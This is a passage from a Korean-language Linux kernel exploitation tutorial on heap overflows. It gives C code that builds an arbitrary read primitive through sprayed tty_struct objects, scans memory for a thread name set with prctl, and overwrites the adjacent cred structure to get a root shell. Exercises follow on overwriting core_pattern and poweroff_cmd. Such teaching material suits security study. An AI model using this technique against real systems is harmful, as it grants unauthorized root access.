    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.
```
따라서 커널 안에 없을 법한 문자열을 `comm`에 설정한 뒤, AAR로 그 문자열을 검색하면 됩니다. `task_struct` 정의를 보면 `comm` 바로 앞에 `cred` 포인터가 있으므로, `comm`을 찾기만 하면 자기 권한 정보를 덮어쓸 수 있습니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
  <p class="says">
    이 방법은 AAR/AAW만 있으면 ROP gadget이나 함수 오프셋에 의존하지 않는 exploit을 작성할 수 있어서, 여러 환경에서 안정적으로 동작하는 exploit을 만들고 싶을 때 편리해.
  </p>
</div>

아이디어를 이해했으니, 이제 실제로 이 방식으로 권한 상승을 구현해 봅시다. AAR는 단순하게 구현해도 되지만, 이번 익스플로잇처럼 많이 호출하는 경우에는 spray한 모든 `tty_struct`를 매번 다 시도하는 것이 너무 느립니다. 그래서 첫 호출에서 올바른 파일 디스크립터를 캐시합니다. 또한 ROP gadget을 심는 `write`는 한 번만 필요하므로, 이후 호출에서는 생략해 성능을 크게 높일 수 있습니다.
```c
int cache_fd = -1;

unsigned int AAR32(unsigned long addr) {
  if (cache_fd == -1) {
    unsigned long *p = (unsigned long*)&buf;
    p[12] = rop_mov_eax_prdx;
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);
  }

  // mov eax, [rdx]; ret;
  if (cache_fd == -1) {
    for (int i = 0; i < 100; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr /* rdx */);
  }
}
```
그다음 `task_struct`가 힙 어디에 있는지 알 수 없으므로, `g_buf` 주소보다 꽤 앞쪽부터 탐색합니다. 저자의 환경에서는 `gdb`로 봤을 때 대략 `0x200000` 앞에 있었지만, 환경과 힙 상태에 따라 달라질 수 있으므로 넉넉한 범위를 잡습니다.
```c
  // task_struct 탐색
  if (prctl(PR_SET_NAME, "nekomaru") != 0)
    fatal("prctl");
  unsigned long addr;
  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("searching... 0x%016lx\n", addr);

    if (AAR32(addr) == 0x6f6b656e
        && AAR32(addr+4) == 0x7572616d) {
      printf("[+] Found 'comm' at 0x%016lx\n", addr);
      break;
    }
  }
```
`comm` 위치를 찾았다면, 바로 앞에 있는 `cred`를 덮어쓰면 됩니다.
```c
  unsigned long addr_cred = 0;
  addr_cred |= AAR32(addr - 8);
  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
  printf("[+] current->cred = 0x%016lx\n", addr_cred);

  // 실효 ID 덮어쓰기
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i*4, 0); // id=0(root)
  }

  puts("[+] pwned!");
  system("/bin/sh");
```
아래처럼 권한 상승에 성공하면 익스플로잇은 제대로 동작한 것입니다.

<center>
  <img src="img/hbof_cred.png" alt="cred를 덮어써 권한 상승" style="width:400px;">
</center>

이 장에서는 커널 공간 Heap Overflow 취약점을 어떻게 공격하는지 배웠습니다. 사실 여기까지의 지식만으로도 대부분의 취약점을 공격할 수 있습니다. 다음 장에서는 커널 공간의 Use-after-Free를 다루지만, 대부분의 취약점은 결국 kROP 또는 AAR/AAW로 귀결되므로 전체적인 익스플로잇 패턴은 거의 같습니다.

[^1]: 객체 크기는 커널 버전에 따라 달라질 수 있으니 주의하세요.
[^2]: 이것은 Linux가 제공하는 이중 연결 리스트의 일부 포인터입니다. mutex 등과 함께 여러 커널 객체에 존재하므로, 힙 주소 누출에 유용합니다.
[^3]: 그 변수를 사용하는 함수를 역어셈블해 주소를 찾아내는 방법도 있습니다.

----

<div class="column" title="예제">
  이 장에서는 <code>modprobe_path</code>를 덮어써 root 권한으로 명령을 실행했습니다.<br>
  (1) <code>core_pattern</code>을 덮어써 같은 방식으로 root 권한을 획득해 보세요.<br>
  (2) <code>orderly_poweroff</code>, <code>orderly_reboot</code> 같은 함수는 각각 <code>poweroff_cmd</code>, <code>reboot_cmd</code>에 저장된 명령을 <a href="https://elixir.bootlin.com/linux/v5.15/source/kernel/reboot.c#L462">실행합니다</a>. 이 명령 문자열을 덮어쓴 뒤, RIP 제어로 해당 함수를 호출해서 root 셸을 획득해 보세요.<br>
</div>
